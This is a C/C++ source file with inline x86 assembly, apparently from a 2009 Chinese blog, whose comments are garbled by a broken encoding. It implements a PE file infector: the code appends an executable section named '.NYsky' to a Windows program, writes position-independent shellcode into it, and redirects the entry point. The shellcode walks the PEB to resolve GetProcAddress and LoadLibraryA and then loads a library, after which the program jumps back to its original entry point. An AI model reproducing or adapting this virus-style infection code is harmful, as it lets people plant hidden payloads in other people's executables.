/////////////////////////////////////////////////////////////////////////////
// ��ȾPE�ļ�����Դ��
// by Koma   2009-12-18 0:30
// http://blog.csdn.net/wangningyu
// �������ѧϰ�������벻Ҫ���������Ƿ���;��
// ��л��į���ǡ�llydd����ɵ�ָ���뼼��֧�֣�
/////////////////////////////////////////////////////////////////////////////
// ����ͷ�ļ�
//
#include <windows.h>

// ȫ�ֺ�������
/************************************************************************/
BOOL InfectPE(CString strFilePath);				// ��Ⱦָ��·��exe�ļ�
BOOL IsInfect(CString strFile);					// �ж��Ƿ񱻸�Ⱦ��
/************************************************************************/

int main1()
{
	MessageBox(NULL, "���������ɹ���", "����", MB_OK);
	char strFile[MAX_PATH] = "C:\\Users\\ZhangHao\\Desktop\\source.exe";
	InfectPE(strFile);
	return 0;
}
/************************************************************************/
/* ����˵������Ⱦexe�ļ�
/* ��    ����strFile	�ļ�·��
/* �� �� ֵ���ɹ�����TRUE��ʧ�ܷ���FALSE
/************************************************************************/
BOOL InfectPE(CString strFilePath)
{
	FILE*					rwFile;						// ����Ⱦ���ļ�
	IMAGE_SECTION_HEADER	NewSection;					// ����Ҫ��ӵ�����
	IMAGE_NT_HEADERS		NtHeader;						// 
	DWORD					pNT;						// pNT�д��IMAGE_NT_HEADERS�ṹ�ĵ�ַ
	int						nOldSectionNo;
	int						originalOEP;

	if ((rwFile = fopen(strFilePath, "rb")) == NULL) {			// ���ļ�ʧ���򷵻�
		return FALSE;
	}

	if (!CheckPE(rwFile)) {								// �������PE�ļ��򷵻�
		return FALSE;
	}

	fseek(rwFile, 0x3c, 0);
	fread(&pNT, sizeof(DWORD), 1, rwFile);
	fseek(rwFile, pNT, 0);
	fread(&NtHeader, sizeof(IMAGE_NT_HEADERS), 1, rwFile);	// ��ȡԭ�ļ���IMAGE_NT_HEADERS�ṹ
	nOldSectionNo = NtHeader.FileHeader.NumberOfSections;	// ����ԭ�ļ���������
	originalOEP = NtHeader.OptionalHeader.AddressOfEntryPoint;		// ����ԭ�ļ�����OEP
	IMAGE_SECTION_HEADER	lastSectionHeader;						// ����һ��������ԭ�ļ����һ���������Ϣ
	int SECTION_ALIG = NtHeader.OptionalHeader.SectionAlignment;
	int FILE_ALIG = NtHeader.OptionalHeader.FileAlignment;	// �����ļ�����ֵ���������ֵ
	memset(&NewSection, 0, sizeof(IMAGE_SECTION_HEADER));
	fseek(rwFile, pNT + 248, 0);							// ��ԭ�ļ����һ���������Ϣ
	for (int i = 0; i<nOldSectionNo; i++)
		fread(&lastSectionHeader, sizeof(IMAGE_SECTION_HEADER), 1, rwFile);

	FILE	*newfile = fopen(strFilePath, "rb+");
	if (newfile == NULL) {
		return FALSE;
	}
	fseek(newfile, lastSectionHeader.PointerToRawData + lastSectionHeader.SizeOfRawData, SEEK_SET);
	goto shellend;
	__asm
	{
	shell:  PUSHAD
			MOV  EAX, DWORD PTR FS : [30H]; FS:[30H]ָ��PEB
			MOV  EAX, DWORD PTR[EAX + 0CH]; ��ȡPEB_LDR_DATA�ṹ��ָ��
			MOV  EAX, DWORD PTR[EAX + 1CH]; ��ȡLDR_MODULE������׽���inInitializeOrderModuleList��Ա��ָ��
			MOV  EAX, DWORD PTR[EAX]; LDR_MODULE����ڶ�������inInitializeOrderModuleList��Ա��ָ��
			MOV  EAX, DWORD PTR[EAX];
			MOV  EAX, DWORD PTR[EAX + 08H]; inInitializeOrderModuleListƫ��8h��õ�Kernel32.dll��ģ���ַ
			MOV  EBP, EAX; ��Kernel32.dllģ���ַ��ַ����kernel��
			MOV  EAX, DWORD PTR[EAX + 3CH]; ָ��IMAGE_NT_HEADERS
			MOV  EAX, DWORD PTR[EBP + EAX + 120]; ָ�򵼳���
			MOV  ECX, [EBP + EAX + 24]; ȡ�������е����������ֵ���Ŀ
			MOV  EBX, [EBP + EAX + 32]; ȡ�����������ֱ�ĵ�ַ
			ADD  EBX, EBP
			PUSH WORD  PTR 0X00; ����GetProcAddress�ַ���
			PUSH DWORD PTR 0X73736572
			PUSH DWORD PTR 0X64644163
			PUSH DWORD PTR 0X6F725074
			PUSH WORD PTR 0X6547
			MOV  EDX, ESP
			PUSH ECX

			F1 :
			MOV  EDI, EDX
				POP  ECX
				DEC  ECX
				TEST  ECX, ECX
				JZ  EXIT
				MOV  ESI, [EBX + ECX * 4]
				ADD  ESI, EBP
				PUSH  ECX
				MOV  ECX, 15
				REPZ  CMPSB
				TEST  ECX, ECX
				JNZ  F1

				POP  ECX
				MOV  ESI, [EBP + EAX + 36]; ȡ�õ���������ű�ĵ�ַ
				ADD  ESI, EBP
				MOVZX  ESI, WORD PTR[ESI + ECX * 2]; ȡ�ý��뺯����ַ������
				MOV  EDI, [EBP + EAX + 28]; ȡ�ú�����ַ��ĵ�ַ
				ADD  EDI, EBP
				MOV  EDI, [EDI + ESI * 4]; ȡ��GetProcAddress�����ĵ�ַ
				ADD  EDI, EBP

				PUSH WORD PTR 0X00; ����LoadLibraryA�ַ���
				PUSH DWORD PTR 0X41797261
				PUSH DWORD PTR 0X7262694C
				PUSH DWORD PTR 0X64616F4C
				PUSH ESP
				PUSH  EBP
				CALL  EDI; ����GetProcAddressȡ��LoadLibraryA�����ĵ�ַ
				PUSH  WORD PTR 0X00; ��Ӳ�����test������
				PUSH  DWORD PTR 0X74736574
				PUSH  ESP
				CALL  EAX
				EXIT : ADD ESP, 36; ƽ���ջ
				POPAD
	}
shellend:
	char*	pShell;
	int		nShellLen;
	BYTE	jmp = 0xE9;
	__asm
	{
		LEA EAX, shell
		MOV pShell, EAX;
		LEA EBX, shellend
			SUB EBX, EAX
			MOV nShellLen, EBX
	}

	// д��SHELLCODE,
	for (i = 0; i<nShellLen; i++)
		fputc(pShell[i], newfile);

	// SHELLCODE֮������ת��ԭOEP��ָ��
	NewSection.VirtualAddress = lastSectionHeader.VirtualAddress + Align(lastSectionHeader.Misc.VirtualSize, SECTION_ALIG);
	/* 
		E9ָ���Ƕμ����ת��ָ��,ռ5���ֽ�,�����������Ե�ǰָ�����һ��ָ��ĵ�ַ��ƫ����
		Ŀ���ַ�ļ��㹫ʽΪ:��ָ���е�ƫ��ֵ + ��ת��ָ�����һ��ָ��ĵ�ַ
		ƫ���� = Ŀ���ַ - (ת��ָ�����ڵ�ַ + 5)
	*/
	originalOEP = originalOEP - (NewSection.VirtualAddress + nShellLen) - 5;
	fwrite(&jmp, sizeof(jmp), 1, newfile);
	fwrite(&originalOEP, sizeof(originalOEP), 1, newfile);

	// ��������ӵ�������0��������ļ��ж���Ĵ�С
	for (i = 0; i<Align(nShellLen, FILE_ALIG) - nShellLen - 5; i++)
		fputc('/0', newfile);

	// �������е�����
	strcpy((char*)NewSection.Name, ".NYsky");
	NewSection.PointerToRawData = lastSectionHeader.PointerToRawData + lastSectionHeader.SizeOfRawData;
	NewSection.Misc.VirtualSize = nShellLen;
	NewSection.SizeOfRawData = Align(nShellLen, FILE_ALIG);
	NewSection.Characteristics = 0xE0000020;

	// ������ɶ���д��ִ�С�д���µĿ��
	fseek(newfile, pNT + 248 + sizeof(IMAGE_SECTION_HEADER)*nOldSectionNo, 0);
	fwrite(&NewSection, sizeof(IMAGE_SECTION_HEADER), 1, newfile);

	int nNewImageSize = NtHeader.OptionalHeader.SizeOfImage + Align(nShellLen, SECTION_ALIG);
	int nNewSizeofCode = NtHeader.OptionalHeader.SizeOfCode + Align(nShellLen, FILE_ALIG);
	fseek(newfile, pNT, 0);
	NtHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].VirtualAddress = 0;
	NtHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].Size = 0;
	NtHeader.OptionalHeader.SizeOfCode = nNewSizeofCode;
	NtHeader.OptionalHeader.SizeOfImage = nNewImageSize;
	NtHeader.FileHeader.NumberOfSections = nOldSectionNo + 1;
	// ������ڵ�
	NtHeader.OptionalHeader.AddressOfEntryPoint = NewSection.VirtualAddress;

	// д����º��PEͷ�ṹ
	fwrite(&NtHeader, sizeof(IMAGE_NT_HEADERS), 1, newfile);
	fclose(newfile);
	fclose(rwFile);
	return TRUE;
}
/************************************************************************/
/* ����˵������������������ݺ�Ĵ�С
/* ��    ����size		�����С
/*			 align		�����ĳ���
/* �� �� ֵ���������ݺ�Ĵ�С
/************************************************************************/
BOOL CheckPE(FILE* pFile)
{
	fseek(pFile, 0, SEEK_SET);
	BOOL  bFlags = FALSE;
	WORD  IsMZ;
	DWORD  IsPE, pNT;
	fread(&IsMZ, sizeof(WORD), 1, pFile);
	if (IsMZ == 0x5A4D)
	{
		fseek(pFile, 0x3c, SEEK_SET);
		fread(&pNT, sizeof(DWORD), 1, pFile);
		fseek(pFile, pNT, SEEK_SET);
		fread(&IsPE, sizeof(DWORD), 1, pFile);
		if (IsPE == 0X00004550)
			bFlags = TRUE;
		else
			bFlags = FALSE;
	}
	else {
		bFlags = FALSE;
	}
	fseek(pFile, 0, SEEK_SET);
	return bFlags;
}
/************************************************************************/
/* ����˵������������������ݺ�Ĵ�С
/* ��    ����size		�����С
/*			 align		�����ĳ���
/* �� �� ֵ���������ݺ�Ĵ�С
/************************************************************************/
int Align(int size, unsigned int align)
{
	if (size%align != 0)
		return (size / align + 1)*align;
	else
		return size;
}
